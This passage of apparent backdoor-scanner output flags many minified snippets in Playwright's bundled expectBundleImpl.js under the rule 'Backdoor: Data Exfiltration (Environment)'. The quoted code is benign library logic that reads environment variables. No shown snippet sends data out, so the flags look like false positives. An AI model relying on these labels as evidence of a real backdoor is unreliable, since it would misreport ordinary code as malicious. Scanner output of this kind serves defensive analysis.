                      "text": "on t(r,n){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Object.defineProperty(t,ts,{value:e}),t}(re.close),re.closeSync=function(e){function t(r){e.apply(re,arguments),ml()}return Object.defineProperty(t,ts,{value:e}),t}(re.closeSync),/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&process.on(\"exit\",function(){Pt(re[ge]),require(\"assert\").equal(re[ge].length,0)}));var gl;global[ge]||yl(global,re[ge]);Fi.exports=Pi(pm(re));process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&!re.__patched&&(Fi.exports=Pi(re),re.__patched=!0);function Pi(e){lm(e),e.gracefulify=Pi,e.creat",
                      "markdown": "`on t(r,n){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Object.defineProperty(t,ts,{value:e}),t}(re.close),re.closeSync=function(e){function t(r){e.apply(re,arguments),ml()}return Object.defineProperty(t,ts,{value:e}),t}(re.closeSync),/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&process.on(\"exit\",function(){Pt(re[ge]),require(\"assert\").equal(re[ge].length,0)}));var gl;global[ge]||yl(global,re[ge]);Fi.exports=Pi(pm(re));process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&!re.__patched&&(Fi.exports=Pi(re),re.__patched=!0);function Pi(e){lm(e),e.gracefulify=Pi,e.creat`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 12401,
                  "endLine": 45,
                  "endColumn": 12412,
                  "snippet": {
                    "text": "ol.for==\"function\"?(ge=Symbol.for(\"graceful-fs.queue\"),ts=Symbol.for(\"graceful-fs.previous\")):(ge=\"___graceful-fs.queue\",ts=\"___graceful-fs.previous\");function hm(){}function yl(e,t){Object.defineProperty(e,ge,{get:function(){return t}})}var Pt=hm;Zn.debuglog?Pt=Zn.debuglog(\"gfs4\"):/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&(Pt=function(){var e=Zn.format.apply(Zn,arguments);e=\"GFS4: \"+e.split(/\\n/).join(`\nGFS4: `),console.error(e)});re[ge]||(gl=global[ge]||[],yl(re,gl),re.close=function(e){function t(r,n){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Obj",
                    "rendered": {
                      "text": "ol.for==\"function\"?(ge=Symbol.for(\"graceful-fs.queue\"),ts=Symbol.for(\"graceful-fs.previous\")):(ge=\"___graceful-fs.queue\",ts=\"___graceful-fs.previous\");function hm(){}function yl(e,t){Object.defineProperty(e,ge,{get:function(){return t}})}var Pt=hm;Zn.debuglog?Pt=Zn.debuglog(\"gfs4\"):/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&(Pt=function(){var e=Zn.format.apply(Zn,arguments);e=\"GFS4: \"+e.split(/\\n/).join(`\nGFS4: `),console.error(e)});re[ge]||(gl=global[ge]||[],yl(re,gl),re.close=function(e){function t(r,n){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Obj",
                      "markdown": "`ol.for==\"function\"?(ge=Symbol.for(\"graceful-fs.queue\"),ts=Symbol.for(\"graceful-fs.previous\")):(ge=\"___graceful-fs.queue\",ts=\"___graceful-fs.previous\");function hm(){}function yl(e,t){Object.defineProperty(e,ge,{get:function(){return t}})}var Pt=hm;Zn.debuglog?Pt=Zn.debuglog(\"gfs4\"):/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&(Pt=function(){var e=Zn.format.apply(Zn,arguments);e=\"GFS4: \"+e.split(/\\n/).join(`\nGFS4: `),console.error(e)});re[ge]||(gl=global[ge]||[],yl(re,gl),re.close=function(e){function t(r,n){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Obj`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 6327,
                  "endLine": 45,
                  "endColumn": 6338,
                  "snippet": {
                    "text": "Li=process.platform===\"win32\",tm=\" \\u203A \";bt.ARROW=tm;var rm={failed:Li?\"\\xD7\":\"\\u2715\",pending:\"\\u25CB\",success:Li?\"\\u221A\":\"\\u2713\",todo:\"\\u270E\"};bt.ICONS=rm;var nm=Li?\"\\x1B[2J\\x1B[0f\":\"\\x1B[2J\\x1B[3J\\x1B[H\";bt.CLEAR=nm});var cl=R((Kv,al)=>{var vt=require(\"constants\"),sm=process.cwd,Jn=null,im=process.env.GRACEFUL_FS_PLATFORM||process.platform;process.cwd=function(){return Jn||(Jn=sm.call(process)),Jn};try{process.cwd()}catch{}typeof process.chdir==\"function\"&&(xi=process.chdir,process.chdir=function(e){Jn=null,xi.call(process,e)},Object.setPrototypeOf&&Object.setPrototypeOf(process.chdir,xi));var x",
                    "rendered": {
                      "text": "Li=process.platform===\"win32\",tm=\" \\u203A \";bt.ARROW=tm;var rm={failed:Li?\"\\xD7\":\"\\u2715\",pending:\"\\u25CB\",success:Li?\"\\u221A\":\"\\u2713\",todo:\"\\u270E\"};bt.ICONS=rm;var nm=Li?\"\\x1B[2J\\x1B[0f\":\"\\x1B[2J\\x1B[3J\\x1B[H\";bt.CLEAR=nm});var cl=R((Kv,al)=>{var vt=require(\"constants\"),sm=process.cwd,Jn=null,im=process.env.GRACEFUL_FS_PLATFORM||process.platform;process.cwd=function(){return Jn||(Jn=sm.call(process)),Jn};try{process.cwd()}catch{}typeof process.chdir==\"function\"&&(xi=process.chdir,process.chdir=function(e){Jn=null,xi.call(process,e)},Object.setPrototypeOf&&Object.setPrototypeOf(process.chdir,xi));var x",
                      "markdown": "`Li=process.platform===\"win32\",tm=\" \\u203A \";bt.ARROW=tm;var rm={failed:Li?\"\\xD7\":\"\\u2715\",pending:\"\\u25CB\",success:Li?\"\\u221A\":\"\\u2713\",todo:\"\\u270E\"};bt.ICONS=rm;var nm=Li?\"\\x1B[2J\\x1B[0f\":\"\\x1B[2J\\x1B[3J\\x1B[H\";bt.CLEAR=nm});var cl=R((Kv,al)=>{var vt=require(\"constants\"),sm=process.cwd,Jn=null,im=process.env.GRACEFUL_FS_PLATFORM||process.platform;process.cwd=function(){return Jn||(Jn=sm.call(process)),Jn};try{process.cwd()}catch{}typeof process.chdir==\"function\"&&(xi=process.chdir,process.chdir=function(e){Jn=null,xi.call(process,e)},Object.setPrototypeOf&&Object.setPrototypeOf(process.chdir,xi));var x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 5471,
                  "endLine": 45,
                  "endColumn": 5482,
                  "snippet": {
                    "text": "ncludes):\"any\"in e?e.any.some(function(t){return!!le[t]}):Object.keys(e).every(function(t){return le[t]===e[t]})}});var Ii=R(Xn=>{\"use strict\";Object.defineProperty(Xn,\"__esModule\",{value:!0});Xn.default=void 0;function nl(){let e=rl();return nl=function(){return e},e}var Qg=!!process.stdout.isTTY&&process.env.TERM!==\"dumb\"&&!nl().isCI;Xn.default=Qg});var ul=R(Qn=>{\"use strict\";Object.defineProperty(Qn,\"__esModule\",{value:!0});Qn.print=Zg;Qn.remove=em;function sl(){let e=Ni(Jt());return sl=function(){return e},e}var Jg=Ni($i()),il=Ni(Ii());function Ni(e){return e&&e.__esModule?e:{default:e}}function Zg(e",
                    "rendered": {
                      "text": "ncludes):\"any\"in e?e.any.some(function(t){return!!le[t]}):Object.keys(e).every(function(t){return le[t]===e[t]})}});var Ii=R(Xn=>{\"use strict\";Object.defineProperty(Xn,\"__esModule\",{value:!0});Xn.default=void 0;function nl(){let e=rl();return nl=function(){return e},e}var Qg=!!process.stdout.isTTY&&process.env.TERM!==\"dumb\"&&!nl().isCI;Xn.default=Qg});var ul=R(Qn=>{\"use strict\";Object.defineProperty(Qn,\"__esModule\",{value:!0});Qn.print=Zg;Qn.remove=em;function sl(){let e=Ni(Jt());return sl=function(){return e},e}var Jg=Ni($i()),il=Ni(Ii());function Ni(e){return e&&e.__esModule?e:{default:e}}function Zg(e",
                      "markdown": "`ncludes):\"any\"in e?e.any.some(function(t){return!!le[t]}):Object.keys(e).every(function(t){return le[t]===e[t]})}});var Ii=R(Xn=>{\"use strict\";Object.defineProperty(Xn,\"__esModule\",{value:!0});Xn.default=void 0;function nl(){let e=rl();return nl=function(){return e},e}var Qg=!!process.stdout.isTTY&&process.env.TERM!==\"dumb\"&&!nl().isCI;Xn.default=Qg});var ul=R(Qn=>{\"use strict\";Object.defineProperty(Qn,\"__esModule\",{value:!0});Qn.print=Zg;Qn.remove=em;function sl(){let e=Ni(Jt());return sl=function(){return e},e}var Jg=Ni($i()),il=Ni(Ii());function Ni(e){return e&&e.__esModule?e:{default:e}}function Zg(e`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 4402,
                  "endLine": 45,
                  "endColumn": 4413,
                  "snippet": {
                    "text": "ID\"},{name:\"Woodpecker\",constant:\"WOODPECKER\",env:{CI:\"woodpecker\"},pr:{CI_BUILD_EVENT:\"pull_request\"}},{name:\"Xcode Cloud\",constant:\"XCODE_CLOUD\",env:\"CI_XCODE_PROJECT\",pr:\"CI_PULL_REQUEST_NUMBER\"},{name:\"Xcode Server\",constant:\"XCODE_SERVER\",env:\"XCS\"}]});var rl=R($e=>{\"use strict\";var tl=Zc(),le=process.env;Object.defineProperty($e,\"_vendors\",{value:tl.map(function(e){return e.constant})});$e.name=null;$e.isPR=null;tl.forEach(function(e){let r=(Array.isArray(e.env)?e.env:[e.env]).every(function(n){return el(n)});if($e[e.constant]=r,!!r)switch($e.name=e.name,typeof e.pr){case\"string\":$e.isPR=!!le[e.pr]",
                    "rendered": {
                      "text": "ID\"},{name:\"Woodpecker\",constant:\"WOODPECKER\",env:{CI:\"woodpecker\"},pr:{CI_BUILD_EVENT:\"pull_request\"}},{name:\"Xcode Cloud\",constant:\"XCODE_CLOUD\",env:\"CI_XCODE_PROJECT\",pr:\"CI_PULL_REQUEST_NUMBER\"},{name:\"Xcode Server\",constant:\"XCODE_SERVER\",env:\"XCS\"}]});var rl=R($e=>{\"use strict\";var tl=Zc(),le=process.env;Object.defineProperty($e,\"_vendors\",{value:tl.map(function(e){return e.constant})});$e.name=null;$e.isPR=null;tl.forEach(function(e){let r=(Array.isArray(e.env)?e.env:[e.env]).every(function(n){return el(n)});if($e[e.constant]=r,!!r)switch($e.name=e.name,typeof e.pr){case\"string\":$e.isPR=!!le[e.pr]",
                      "markdown": "`ID\"},{name:\"Woodpecker\",constant:\"WOODPECKER\",env:{CI:\"woodpecker\"},pr:{CI_BUILD_EVENT:\"pull_request\"}},{name:\"Xcode Cloud\",constant:\"XCODE_CLOUD\",env:\"CI_XCODE_PROJECT\",pr:\"CI_PULL_REQUEST_NUMBER\"},{name:\"Xcode Server\",constant:\"XCODE_SERVER\",env:\"XCS\"}]});var rl=R($e=>{\"use strict\";var tl=Zc(),le=process.env;Object.defineProperty($e,\"_vendors\",{value:tl.map(function(e){return e.constant})});$e.name=null;$e.isPR=null;tl.forEach(function(e){let r=(Array.isArray(e.env)?e.env:[e.env]).every(function(n){return el(n)});if($e[e.constant]=r,!!r)switch($e.name=e.name,typeof e.pr){case\"string\":$e.isPR=!!le[e.pr]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 7960,
                  "endLine": 7,
                  "endColumn": 7971,
                  "snippet": {
                    "text": "ncMode=Te,z.isConcurrentMode=_e,z.isContextConsumer=qt,z.isContextProvider=Ls,z.isElement=Ht,z.isForwardRef=et,z.isFragment=K,z.isLazy=Ut,z.isMemo=xs,z.isPortal=I,z.isProfiler=X,z.isStrictMode=S,z.isSuspense=U,z.isSuspenseList=J,z.isValidElementType=w,z.typeOf=M}()});var Ia=R((vv,ii)=>{\"use strict\";process.env.NODE_ENV===\"production\"?ii.exports=Ma():ii.exports=$a()});var Fa=R(dt=>{\"use strict\";Object.defineProperty(dt,\"__esModule\",{value:!0});dt.test=dt.serialize=dt.default=void 0;var wt=t1(Ia()),Fn=Sn();function La(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(La=fu",
                    "rendered": {
                      "text": "ncMode=Te,z.isConcurrentMode=_e,z.isContextConsumer=qt,z.isContextProvider=Ls,z.isElement=Ht,z.isForwardRef=et,z.isFragment=K,z.isLazy=Ut,z.isMemo=xs,z.isPortal=I,z.isProfiler=X,z.isStrictMode=S,z.isSuspense=U,z.isSuspenseList=J,z.isValidElementType=w,z.typeOf=M}()});var Ia=R((vv,ii)=>{\"use strict\";process.env.NODE_ENV===\"production\"?ii.exports=Ma():ii.exports=$a()});var Fa=R(dt=>{\"use strict\";Object.defineProperty(dt,\"__esModule\",{value:!0});dt.test=dt.serialize=dt.default=void 0;var wt=t1(Ia()),Fn=Sn();function La(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(La=fu",
                      "markdown": "`ncMode=Te,z.isConcurrentMode=_e,z.isContextConsumer=qt,z.isContextProvider=Ls,z.isElement=Ht,z.isForwardRef=et,z.isFragment=K,z.isLazy=Ut,z.isMemo=xs,z.isPortal=I,z.isProfiler=X,z.isStrictMode=S,z.isSuspense=U,z.isSuspenseList=J,z.isValidElementType=w,z.typeOf=M}()});var Ia=R((vv,ii)=>{\"use strict\";process.env.NODE_ENV===\"production\"?ii.exports=Ma():ii.exports=$a()});var Fa=R(dt=>{\"use strict\";Object.defineProperty(dt,\"__esModule\",{value:!0});dt.test=dt.serialize=dt.default=void 0;var wt=t1(Ia()),Fn=Sn();function La(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(La=fu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 5611,
                  "endLine": 7,
                  "endColumn": 5622,
                  "snippet": {
                    "text": "n(e){return typeof e==\"string\"||typeof e==\"function\"||e===Tn||e===Mn||e===wn||e===Ln||e===xn||e===e1||typeof e==\"object\"&&e!==null&&(e.$$typeof===Dn||e.$$typeof===Pn||e.$$typeof===$n||e.$$typeof===In||e.$$typeof===Nn||e.$$typeof===wa||e.getModuleId!==void 0)};V.typeOf=De});var $a=R(z=>{\"use strict\";process.env.NODE_ENV!==\"production\"&&function(){\"use strict\";var e=Symbol.for(\"react.element\"),t=Symbol.for(\"react.portal\"),r=Symbol.for(\"react.fragment\"),n=Symbol.for(\"react.strict_mode\"),s=Symbol.for(\"react.profiler\"),i=Symbol.for(\"react.provider\"),u=Symbol.for(\"react.context\"),o=Symbol.for(\"react.server_con",
                    "rendered": {
                      "text": "n(e){return typeof e==\"string\"||typeof e==\"function\"||e===Tn||e===Mn||e===wn||e===Ln||e===xn||e===e1||typeof e==\"object\"&&e!==null&&(e.$$typeof===Dn||e.$$typeof===Pn||e.$$typeof===$n||e.$$typeof===In||e.$$typeof===Nn||e.$$typeof===wa||e.getModuleId!==void 0)};V.typeOf=De});var $a=R(z=>{\"use strict\";process.env.NODE_ENV!==\"production\"&&function(){\"use strict\";var e=Symbol.for(\"react.element\"),t=Symbol.for(\"react.portal\"),r=Symbol.for(\"react.fragment\"),n=Symbol.for(\"react.strict_mode\"),s=Symbol.for(\"react.profiler\"),i=Symbol.for(\"react.provider\"),u=Symbol.for(\"react.context\"),o=Symbol.for(\"react.server_con",
                      "markdown": "`n(e){return typeof e==\"string\"||typeof e==\"function\"||e===Tn||e===Mn||e===wn||e===Ln||e===xn||e===e1||typeof e==\"object\"&&e!==null&&(e.$$typeof===Dn||e.$$typeof===Pn||e.$$typeof===$n||e.$$typeof===In||e.$$typeof===Nn||e.$$typeof===wa||e.getModuleId!==void 0)};V.typeOf=De});var $a=R(z=>{\"use strict\";process.env.NODE_ENV!==\"production\"&&function(){\"use strict\";var e=Symbol.for(\"react.element\"),t=Symbol.for(\"react.portal\"),r=Symbol.for(\"react.fragment\"),n=Symbol.for(\"react.strict_mode\"),s=Symbol.for(\"react.profiler\"),i=Symbol.for(\"react.provider\"),u=Symbol.for(\"react.context\"),o=Symbol.for(\"react.server_con`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 7446,
                  "endLine": 46,
                  "endColumn": 7455,
                  "snippet": {
                    "text": "elete e[a],delete t[a],!0}function s(o,a){return e[a]}function i(o,a){return typeof a==\"string\"?t[a in Cl?a:a.toLowerCase()]:e[a]}let u=new Proxy(e,{deleteProperty:Rl?r:n,get:Rl?i:s,set(o,a,l){let c=`${l}`;return typeof a==\"string\"&&(t[a.toLowerCase()]=c),e[a]=c,!0}});return Object.assign(u,process.env)}function Rm(){let e=require(\"process\"),t=(0,Em.default)(e,{blacklist:vm,keepPrototype:!0});try{t[Symbol.toStringTag]=\"process\"}catch(n){if(t[Symbol.toStringTag]!==\"process\")throw n.message=`Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n${n.message}`,n",
                    "rendered": {
                      "text": "elete e[a],delete t[a],!0}function s(o,a){return e[a]}function i(o,a){return typeof a==\"string\"?t[a in Cl?a:a.toLowerCase()]:e[a]}let u=new Proxy(e,{deleteProperty:Rl?r:n,get:Rl?i:s,set(o,a,l){let c=`${l}`;return typeof a==\"string\"&&(t[a.toLowerCase()]=c),e[a]=c,!0}});return Object.assign(u,process.env)}function Rm(){let e=require(\"process\"),t=(0,Em.default)(e,{blacklist:vm,keepPrototype:!0});try{t[Symbol.toStringTag]=\"process\"}catch(n){if(t[Symbol.toStringTag]!==\"process\")throw n.message=`Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n${n.message}`,n",
                      "markdown": "`elete e[a],delete t[a],!0}function s(o,a){return e[a]}function i(o,a){return typeof a==\"string\"?t[a in Cl?a:a.toLowerCase()]:e[a]}let u=new Proxy(e,{deleteProperty:Rl?r:n,get:Rl?i:s,set(o,a,l){let c=`${l}`;return typeof a==\"string\"&&(t[a.toLowerCase()]=c),e[a]=c,!0}});return Object.assign(u,process.env)}function Rm(){let e=require(\"process\"),t=(0,Em.default)(e,{blacklist:vm,keepPrototype:!0});try{t[Symbol.toStringTag]=\"process\"}catch(n){if(t[Symbol.toStringTag]!==\"process\")throw n.message=`Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n${n.message}`,n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 6862,
                  "endLine": 46,
                  "endColumn": 6914,
                  "snippet": {
                    "text": ".keepPrototype},r);return n}});var Ol=R(Ui=>{\"use strict\";Object.defineProperty(Ui,\"__esModule\",{value:!0});Ui.default=Rm;var Em=bm(ns());function bm(e){return e&&e.__esModule?e:{default:e}}var vm=new Set([\"env\",\"mainModule\",\"_events\"]),Rl=process.platform===\"win32\",Cl=Object.getPrototypeOf(process.env);function _m(){let e=Object.create(Cl),t={};function r(o,a){for(let l in e)Object.prototype.hasOwnProperty.call(e,l)&&(typeof a==\"string\"?l.toLowerCase()===a.toLowerCase()&&(delete e[l],delete t[l.toLowerCase()]):a===l&&(delete e[l],delete t[l]));return!0}function n(o,a){return delete e[a],delete t[a],!0}function s(o,a){return e[a]}function i(o,a",
                    "rendered": {
                      "text": ".keepPrototype},r);return n}});var Ol=R(Ui=>{\"use strict\";Object.defineProperty(Ui,\"__esModule\",{value:!0});Ui.default=Rm;var Em=bm(ns());function bm(e){return e&&e.__esModule?e:{default:e}}var vm=new Set([\"env\",\"mainModule\",\"_events\"]),Rl=process.platform===\"win32\",Cl=Object.getPrototypeOf(process.env);function _m(){let e=Object.create(Cl),t={};function r(o,a){for(let l in e)Object.prototype.hasOwnProperty.call(e,l)&&(typeof a==\"string\"?l.toLowerCase()===a.toLowerCase()&&(delete e[l],delete t[l.toLowerCase()]):a===l&&(delete e[l],delete t[l]));return!0}function n(o,a){return delete e[a],delete t[a],!0}function s(o,a){return e[a]}function i(o,a",
                      "markdown": "`.keepPrototype},r);return n}});var Ol=R(Ui=>{\"use strict\";Object.defineProperty(Ui,\"__esModule\",{value:!0});Ui.default=Rm;var Em=bm(ns());function bm(e){return e&&e.__esModule?e:{default:e}}var vm=new Set([\"env\",\"mainModule\",\"_events\"]),Rl=process.platform===\"win32\",Cl=Object.getPrototypeOf(process.env);function _m(){let e=Object.create(Cl),t={};function r(o,a){for(let l in e)Object.prototype.hasOwnProperty.call(e,l)&&(typeof a==\"string\"?l.toLowerCase()===a.toLowerCase()&&(delete e[l],delete t[l.toLowerCase()]):a===l&&(delete e[l],delete t[l]));return!0}function n(o,a){return delete e[a],delete t[a],!0}function s(o,a){return e[a]}function i(o,a`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 400,
                  "endLine": 46,
                  "endColumn": 443,
                  "snippet": {
                    "text": "){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Object.defineProperty(t,ts,{value:e}),t}(re.close),re.closeSync=function(e){function t(r){e.apply(re,arguments),ml()}return Object.defineProperty(t,ts,{value:e}),t}(re.closeSync),/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&process.on(\"exit\",function(){Pt(re[ge]),require(\"assert\").equal(re[ge].length,0)}));var gl;global[ge]||yl(global,re[ge]);Fi.exports=Pi(pm(re));process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&!re.__patched&&(Fi.exports=Pi(re),re.__patched=!0);function Pi(e){lm(e),e.gracefulify=Pi,e.createReadStream=M,e.createWriteStream=k;var ",
                    "rendered": {
                      "text": "){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Object.defineProperty(t,ts,{value:e}),t}(re.close),re.closeSync=function(e){function t(r){e.apply(re,arguments),ml()}return Object.defineProperty(t,ts,{value:e}),t}(re.closeSync),/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&process.on(\"exit\",function(){Pt(re[ge]),require(\"assert\").equal(re[ge].length,0)}));var gl;global[ge]||yl(global,re[ge]);Fi.exports=Pi(pm(re));process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&!re.__patched&&(Fi.exports=Pi(re),re.__patched=!0);function Pi(e){lm(e),e.gracefulify=Pi,e.createReadStream=M,e.createWriteStream=k;var ",
                      "markdown": "`){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Object.defineProperty(t,ts,{value:e}),t}(re.close),re.closeSync=function(e){function t(r){e.apply(re,arguments),ml()}return Object.defineProperty(t,ts,{value:e}),t}(re.closeSync),/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&process.on(\"exit\",function(){Pt(re[ge]),require(\"assert\").equal(re[ge].length,0)}));var gl;global[ge]||yl(global,re[ge]);Fi.exports=Pi(pm(re));process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&!re.__patched&&(Fi.exports=Pi(re),re.__patched=!0);function Pi(e){lm(e),e.gracefulify=Pi,e.createReadStream=M,e.createWriteStream=k;var `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 12409,
                  "endLine": 45,
                  "endColumn": 12438,
                  "snippet": {
                    "text": "\"function\"?(ge=Symbol.for(\"graceful-fs.queue\"),ts=Symbol.for(\"graceful-fs.previous\")):(ge=\"___graceful-fs.queue\",ts=\"___graceful-fs.previous\");function hm(){}function yl(e,t){Object.defineProperty(e,ge,{get:function(){return t}})}var Pt=hm;Zn.debuglog?Pt=Zn.debuglog(\"gfs4\"):/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&(Pt=function(){var e=Zn.format.apply(Zn,arguments);e=\"GFS4: \"+e.split(/\\n/).join(`\nGFS4: `),console.error(e)});re[ge]||(gl=global[ge]||[],yl(re,gl),re.close=function(e){function t(r,n){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Object.defineProperty(t,ts,{v",
                    "rendered": {
                      "text": "\"function\"?(ge=Symbol.for(\"graceful-fs.queue\"),ts=Symbol.for(\"graceful-fs.previous\")):(ge=\"___graceful-fs.queue\",ts=\"___graceful-fs.previous\");function hm(){}function yl(e,t){Object.defineProperty(e,ge,{get:function(){return t}})}var Pt=hm;Zn.debuglog?Pt=Zn.debuglog(\"gfs4\"):/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&(Pt=function(){var e=Zn.format.apply(Zn,arguments);e=\"GFS4: \"+e.split(/\\n/).join(`\nGFS4: `),console.error(e)});re[ge]||(gl=global[ge]||[],yl(re,gl),re.close=function(e){function t(r,n){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Object.defineProperty(t,ts,{v",
